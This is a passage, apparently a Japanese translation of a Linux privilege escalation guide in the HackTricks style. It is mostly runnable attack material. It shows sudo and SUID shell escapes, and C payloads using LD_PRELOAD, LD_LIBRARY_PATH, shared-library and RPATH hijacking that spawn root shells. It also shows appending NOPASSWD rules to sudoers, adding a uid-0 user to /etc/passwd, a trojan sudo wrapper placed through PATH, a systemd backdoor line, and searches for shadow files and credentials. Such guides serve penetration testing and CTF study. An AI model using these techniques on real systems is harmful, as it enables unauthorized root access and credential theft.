#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大きなUID

一部のLinuxバージョンは、**UID > INT\_MAX**を持つユーザーが特権を昇格させることができるバグの影響を受けました。詳細は[こちら](https://gitlab.freedesktop.org/polkit/polkit/issues/74)、[こちら](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)、および[こちら](https://twitter.com/paragonsec/status/1071152249529884674)を参照してください。\
**`systemd-run -t /bin/bash`**を使用して**悪用**してください。

### グループ

ルート権限を付与する可能性のある**いくつかのグループ**のメンバーであるかどうかを確認してください：

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### クリップボード

クリップボード内に興味深い情報があるかどうかを確認してください（可能であれば）
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

環境の**任意のパスワード**を知っている場合は、各ユーザーとしてログインを試みてください。

### Su Brute

たくさんのノイズを気にしない場合、かつコンピューターに`su`と`timeout`バイナリが存在する場合、[su-bruteforce](https://github.com/carlospolop/su-bruteforce)を使用してユーザーをブルートフォースできます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)は、`-a`パラメータを使用してユーザーをブルートフォースしようとします。

## 書き込み可能なPATHの悪用

### $PATH

$PATHのいくつかのフォルダに**書き込みができることがわかった場合**、書き込み可能なフォルダ内に**バックドアを作成**して、別のユーザー（理想的にはroot）によって実行される予定のコマンドの名前を付けることで、特権を昇格させることができるかもしれません。このコマンドは、$PATH内の書き込み可能なフォルダより前に配置されていないフォルダから読み込まれるものである必要があります。

### SUDOとSUID

sudoを使用していくつかのコマンドを実行することが許可されているか、suidビットが設定されているかもしれません。次のコマンドを使用して確認してください：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
いくつかの**予期しないコマンドが、ファイルの読み取りや書き込み、さらにはコマンドの実行を許可します。** たとえば：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudoの設定は、ユーザーがパスワードを知らなくても、別のユーザーの特権でコマンドを実行できるようにする可能性があります。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
以下は、ユーザー`demo`が`root`として`vim`を実行できる例です。これにより、`root`ディレクトリにsshキーを追加するか、`sh`を呼び出すことでシェルを取得することが簡単になりました。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、**何かを実行する際に環境変数を設定**することをユーザーに許可します：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**HTBマシンAdmirer**に基づいており、スクリプトをrootとして実行する際に**PYTHONPATHハイジャック**に**脆弱**で、任意のPythonライブラリを読み込むことができました。
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo実行パスのバイパス

他のファイルを読むか、**シンボリックリンク**を使用します。例えば、sudoersファイル内: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
**ワイルドカード** (\*) を使用すると、さらに簡単です：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### コマンド/SUID バイナリのパス指定なしでの Sudo コマンド

もし**sudo 権限**が**パスを指定せずに**単一のコマンドに与えられている場合: _hacker10 ALL= (root) less_、PATH 変数を変更することで悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
このテクニックは、**suid** バイナリが**パスを指定せずに別のコマンドを実行する場合にも使用できます（常に** _**strings**_ **で奇妙なSUIDバイナリの内容を確認してください）**。

[実行するペイロードの例。](payloads-to-execute.md)

### コマンドパスを指定したSUIDバイナリ

もし**suid**バイナリが**パスを指定して別のコマンドを実行する**場合、その場合、suidファイルが呼び出しているコマンドと同じ名前の関数を**エクスポート**してみることができます。

例えば、suidバイナリが _**/usr/sbin/service apache2 start**_ を呼び出す場合、その関数を作成してエクスポートする必要があります：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

**LD\_PRELOAD**環境変数は、標準Cライブラリ（`libc.so`）を含む他のすべてのライブラリよりも前に、1つ以上の共有ライブラリ（.soファイル）をローダーによって読み込むよう指定するために使用されます。このプロセスは、ライブラリのプリロードとして知られています。

ただし、システムセキュリティを維持し、特に**suid/sgid**実行可能ファイルでこの機能が悪用されるのを防ぐために、システムは特定の条件を強制します：

- ローダーは、実ユーザーID（_ruid_）が有効ユーザーID（_euid_）と一致しない実行可能ファイルに対して**LD\_PRELOAD**を無視します。
- suid/sgidを持つ実行可能ファイルの場合、標準パスにあるかつsuid/sgidであるライブラリのみがプリロードされます。

特権昇格は、`sudo`でコマンドを実行できる権限がある場合、かつ`sudo -l`の出力に**env\_keep+=LD\_PRELOAD**ステートメントが含まれている場合に発生する可能性があります。この構成により、**LD\_PRELOAD**環境変数が永続化され、`sudo`でコマンドが実行されている場合でも認識されるようになり、特権を昇格させた状態で任意のコードが実行される可能性があります。
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c**として保存します。
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
その後、次のように**コンパイル**してください：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**特権を昇格**して実行します。
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
攻撃者が**LD\_LIBRARY\_PATH**環境変数を制御している場合、同様の権限昇格が悪用される可能性があります。なぜなら、攻撃者はライブラリが検索されるパスを制御しているからです。
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID バイナリ – .so インジェクション

SUID 権限を持つバイナリが異常に見える場合、.so ファイルを適切に読み込んでいるかどうかを確認するのが良い習慣です。次のコマンドを実行して確認できます:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"のようなエラーに遭遇すると、悪用の可能性が示唆されます。

これを悪用するためには、次のコードが含まれたCファイル、例えば"/path/to/.config/libcalc.c"を作成する必要があります:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルおよび実行されると、ファイルの権限を操作して特権を昇格し、特権を持つシェルを実行することを目的としています。

上記のCファイルを共有オブジェクト(.so)ファイルにコンパイルするには、次のコマンドを使用します:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最終的に、影響を受けるSUIDバイナリを実行すると、悪用がトリガーされ、システムが侵害される可能性があります。

## 共有オブジェクトのハイジャック
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
今、私たちが書き込み可能なフォルダからライブラリを読み込むSUIDバイナリを見つけたので、そのフォルダに必要な名前のライブラリを作成しましょう：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
もし次のようなエラーが表示された場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
それは、生成したライブラリに `a_function_name` という名前の関数が必要です。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルセキュリティ制限をバイパスするために悪用できるUnixバイナリの厳選されたリストです。[**GTFOArgs**](https://gtfoargs.github.io/) も同様ですが、コマンドに引数のみをインジェクトできる場合に使用されます。

このプロジェクトは、Unixバイナリの正当な機能を収集し、制限されたシェルから脱出したり、特権を昇格したり、昇格した権限を維持したり、ファイルを転送したり、バインドシェルやリバースシェルを生成したり、他のポストエクスプロイテーションタスクを容易にするために悪用できるものです。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

`sudo -l` にアクセスできる場合、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使用して、どのようにしてsudoルールを悪用できるかを確認できます。

### Sudoトークンの再利用

**sudoアクセス**があるがパスワードがない場合、**sudoコマンドの実行を待ってセッショントークンを乗っ取る**ことで特権を昇格できます。

特権昇格の要件：

* ユーザー "_sampleuser_" としてシェルにアクセスしている
* "_sampleuser_" が**最後の15分間**に`sudo`を使用して何かを実行している（デフォルトでは、パスワードを入力せずに`sudo`を使用できるsudoトークンの有効期間）
* `cat /proc/sys/kernel/yama/ptrace_scope` が0である
* `gdb` にアクセスできる（アップロードできる）

（一時的に `ptrace_scope` を有効にするには、`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を使用するか、`/etc/sysctl.d/10-ptrace.conf` を変更して `kernel.yama.ptrace_scope = 0` と設定します）

これらの要件をすべて満たしている場合、**次のリンクを使用して特権を昇格できます:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* **最初のエクスプロイト** (`exploit.sh`) は、`/tmp/` に `activate_sudo_token` というバイナリを作成します。これを使用して、セッションでsudoトークンを**アクティブ化**できます（自動的にルートシェルを取得するわけではないので、`sudo su` を実行してください）:
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* **第2のエクスプロイト** (`exploit_v2.sh`) は、`/tmp` に所有者が root で setuid が設定された sh シェルを作成します。
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* **第三のエクスプロイト** (`exploit_v3.sh`) は、**sudo トークンを永続化し、すべてのユーザーが sudo を使用できるようにする sudoers ファイルを作成**します
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<ユーザー名>

もし、そのフォルダやフォルダ内で作成されたファイルの**書き込み権限**がある場合、バイナリ[**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools)を使用して**ユーザーとPID用のsudoトークンを作成**できます。\
例えば、_sampleuser_というファイルを上書きでき、PIDが1234のそのユーザーとしてシェルを持っている場合、パスワードを知らなくても、次のように**sudo権限を取得**できます：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` および `/etc/sudoers.d` 内のファイルは、`sudo` を使用できるユーザーと方法を設定します。これらのファイルは**デフォルトでユーザー root およびグループ root だけが読み取れます**。\
このファイルを**読み取る**ことができれば、**興味深い情報を入手**できるかもしれません。また、ファイルを**書き込む**ことができれば、**特権を昇格**できます。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込み権限があれば、この権限を悪用することができます。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
別の権限乱用方法:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo`バイナリの代替として`doas`などがあります。OpenBSDの場合は、その設定を`/etc/doas.conf`で確認してください。
```
permit nopass demo as root cmd vim
```
### Sudoハイジャック

もし**ユーザーが通常マシンに接続し、`sudo`を使用して特権を昇格させる**ことを知っている場合、そのユーザーコンテキスト内でシェルを取得したら、**新しいsudo実行ファイル**を作成して、あなたのコードをrootとして実行し、その後ユーザーのコマンドを実行することができます。その後、ユーザーコンテキストの$PATHを変更します（たとえば、.bash\_profileに新しいパスを追加する）ので、ユーザーがsudoを実行すると、あなたのsudo実行ファイルが実行されます。

ユーザーがbash以外の異なるシェルを使用している場合は、新しいパスを追加するために他のファイルを変更する必要があります。たとえば、[sudo-piggyback](https://github.com/APTy/sudo-piggyback)は`~/.bashrc`、`~/.zshrc`、`~/.bash_profile`を変更します。[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)に別の例があります。

または、次のようなものを実行することもできます：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

`/etc/ld.so.conf`ファイルは**読み込まれる設定ファイルの場所**を示しています。通常、このファイルには次のパスが含まれています：`include /etc/ld.so.conf.d/*.conf`

これは、`/etc/ld.so.conf.d/*.conf`からの設定ファイルが読み込まれることを意味します。この設定ファイルは、**ライブラリが検索される他のフォルダを指す**。例えば、`/etc/ld.so.conf.d/libc.conf`の内容は`/usr/local/lib`です。**これはシステムが`/usr/local/lib`内のライブラリを検索することを意味します**。

何らかの理由で、ユーザーが`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/`内の任意のファイル、または`/etc/ld.so.conf.d/*.conf`内の設定ファイル内の任意のフォルダに書き込み権限を持っている場合、特権を昇格させることができるかもしれません。\
この設定ミスをどのように悪用するかを次のページで確認してください：

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`/var/tmp/flag15/`にライブラリをコピーすることで、`RPATH`変数で指定された場所にプログラムによって使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
## 特権昇格

次に、`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`を使用して、`/var/tmp`に悪意のあるライブラリを作成します。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 機能

Linuxの機能は、プロセスに利用可能なルート権限の**サブセット**を提供します。これにより、ルート権限が**小さな独立したユニット**に分割されます。これらのユニットのそれぞれをプロセスに独立して付与できます。これにより、特権の完全なセットが削減され、悪用のリスクが低下します。\
**機能について詳しく学び、その悪用方法について学ぶ**には、以下のページを読んでください：

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## ディレクトリの権限

ディレクトリ内での**「実行」ビット**は、影響を受けるユーザーがフォルダに**「cd」**できることを意味します。\
**「読み取り」**ビットは、ユーザーが**ファイルをリスト**できることを意味し、**「書き込み」**ビットは、ユーザーが**ファイルを削除**したり**新しいファイルを作成**できることを意味します。

## ACL（アクセス制御リスト）

アクセス制御リスト（ACL）は、伝統的なugo/rwx権限を**オーバーライド**できる二次的な任意の権限を表します。これらの権限により、ファイルやディレクトリへのアクセスをより細かく制御でき、所有者やグループの一部でない特定のユーザーに権利を許可または拒否できます。この**細かい粒度**により、より正確なアクセス管理が確保されます。詳細は[**こちら**](https://linuxconfig.org/how-to-manage-acls-on-linux)で確認できます。

**ユーザー"kali"**にファイルへの**読み取りと書き込み権限**を与える：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**システムから特定のACLを持つファイルを取得する方法:**
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## オープンシェルセッション

**古いバージョン**では、別のユーザー（**root**）の一部の**シェルセッションを乗っ取る**ことができます。\
**最新バージョン**では、**自分のユーザー**のスクリーンセッションにのみ**接続**できます。ただし、**セッション内に興味深い情報を見つける**ことができます。

### スクリーンセッションの乗っ取り

**スクリーンセッションのリスト**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
**セッションにアタッチ**

![](<../../.gitbook/assets/image (138).png>)
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmuxセッションの乗っ取り

これは**古いtmuxバージョン**の問題でした。私は特権を持たないユーザーとしてrootによって作成されたtmux（v2.1）セッションを乗っ取ることができませんでした。

**tmuxセッションのリスト**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../.gitbook/assets/image (834).png>)

**セッションにアタッチする**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Debianベースのシステム（Ubuntu、Kubuntuなど）で2006年9月から2008年5月13日までに生成されたすべてのSSLおよびSSHキーは、このバグの影響を受ける可能性があります。\
このバグは、これらのOSで新しいsshキーを作成する際に発生します。**32,768のバリエーションのみが可能**であるため、すべての可能性を計算でき、**sshの公開鍵を持っていると対応する秘密鍵を検索できます**。計算された可能性はこちらで見つけることができます：[https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSHの興味深い構成値

- **PasswordAuthentication:** パスワード認証が許可されているかどうかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** 公開鍵認証が許可されているかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合、サーバーが空のパスワード文字列でのアカウントへのログインを許可するかどうかを指定します。デフォルトは `no` です。

### PermitRootLogin

rootがsshを使用してログインできるかどうかを指定します。デフォルトは `no` です。可能な値：

- `yes`: rootはパスワードと秘密鍵を使用してログインできます
- `without-password`または`prohibit-password`: rootは秘密鍵のみを使用してログインできます
- `forced-commands-only`: Rootは、プライベートキーを使用してログインし、コマンドオプションが指定されている場合のみログインできます
- `no` : いいえ

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵を含むファイルを指定します。`%h`のようなトークンを含めることができ、これはホームディレクトリに置き換えられます。**絶対パス**（`/`で始まる）または**ユーザーのホームからの相対パス**を示すことができます。例：
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー "**testusername**" の**秘密**鍵でログインしようとすると、ssh があなたの鍵の公開鍵を `/home/testusername/.ssh/authorized_keys` および `/home/testusername/access` にある公開鍵と比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH エージェント転送を使用すると、サーバーに鍵（パスフレーズなしで）を置いたままにする代わりに、**ローカルの SSH キーを使用**できます。そのため、ssh 経由で**ホストにジャンプ**し、そこから**初期ホストにある鍵を使用して**別のホストに**ジャンプ**できます。

このオプションを `$HOME/.ssh.config` に次のように設定する必要があります：
```
Host example.com
ForwardAgent yes
```
`Host` が `*` の場合、ユーザーが別のマシンに移動するたびに、そのホストは鍵にアクセスできるようになります（これはセキュリティ上の問題です）。

ファイル `/etc/ssh_config` はこの **オプションを上書き** して、この構成を許可または拒否できます。\
ファイル `/etc/sshd_config` は `AllowAgentForwarding` キーワードで ssh エージェントの転送を **許可** または **拒否** できます（デフォルトは許可）。

環境で Forward Agent が構成されていることがわかった場合は、以下のページを読んでください。**特権昇格に悪用できる可能性** があります：

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## 興味深いファイル

### プロファイルファイル

ファイル `/etc/profile` および `/etc/profile.d/` 内のファイルは、**ユーザーが新しいシェルを実行したときに実行されるスクリプト** です。したがって、これらのいずれかを **書き込むか変更できれば特権昇格** できます。
```bash
ls -l /etc/profile /etc/profile.d/
```
### パスワード/シャドウファイル

OSによっては、`/etc/passwd`および`/etc/shadow`ファイルが異なる名前を使用しているか、バックアップがあるかもしれません。したがって、**それらをすべて見つけ**、それらを読み取れるかどうかをチェックして、ファイル内にハッシュがあるかどうかを確認することが推奨されています。
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
時々、`/etc/passwd`（または同等の）ファイル内に**パスワードハッシュ**が見つかることがあります。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、次のコマンドのいずれかを使用してパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
次に、ユーザー`hacker`を追加し、生成されたパスワードを追加します。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

`su`コマンドを`hacker:hacker`で使用できます。

代わりに、次の行を使用してパスワードのないダミーユーザーを追加できます。\
警告: 現在のマシンのセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
**注意:** BSDプラットフォームでは、`/etc/passwd`は`/etc/pwd.db`および`/etc/master.passwd`にあり、`/etc/shadow`は`/etc/spwd.db`に名前が変更されています。

あなたが**いくつかの機密ファイルに書き込めるかどうか**を確認すべきです。たとえば、**サービス構成ファイル**に書き込めますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが**tomcat**サーバーを実行しており、**/etc/systemd/**内のTomcatサービス構成ファイルを変更できる場合、次の行を変更できます：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
次回Tomcatが起動されると、あなたのバックドアが実行されます。

### フォルダのチェック

次のフォルダにはバックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（おそらく最後のものは読めないかもしれませんが、試してみてください）
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/所有ファイル
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近の数分間に変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite データベースファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATHにあるスクリプト/バイナリ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)のコードを読み、**パスワードを含む可能性のある複数のファイル**を検索します。\
これを行うために使用できる**別の興味深いツール**は、[**LaZagne**](https://github.com/AlessandroZ/LaZagne)です。これは、Windows、Linux、Mac上に保存されている多くのパスワードを取得するために使用されるオープンソースアプリケーションです。

### ログ

ログを読むことができれば、**それらの中に興味深い/機密情報を見つけることができる**かもしれません。ログがより奇妙であればあるほど、それはより興味深いでしょう（おそらく）。\
また、一部の「**悪意のある**」設定された（バックドアがあるかもしれない？）**監査ログ**は、この投稿で説明されているように、監査ログ内に**パスワードを記録**することを許可するかもしれません: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**ログを読むためには、グループ** [**adm**](interesting-groups-linux-pe/#adm-group) **を本当に役立ちます。**

### シェルファイル
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 一般的な資格情報検索/正規表現

ファイル名や内容に単語 "**password**" を含むファイルをチェックし、ログ内のIPやメールアドレス、ハッシュの正規表現を検索する必要があります。\
これらの手法の実施方法はここに記載しませんが、興味がある場合は、[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が実行する最後のチェックを確認できます。

## 書き込み可能なファイル

### Pythonライブラリの乗っ取り

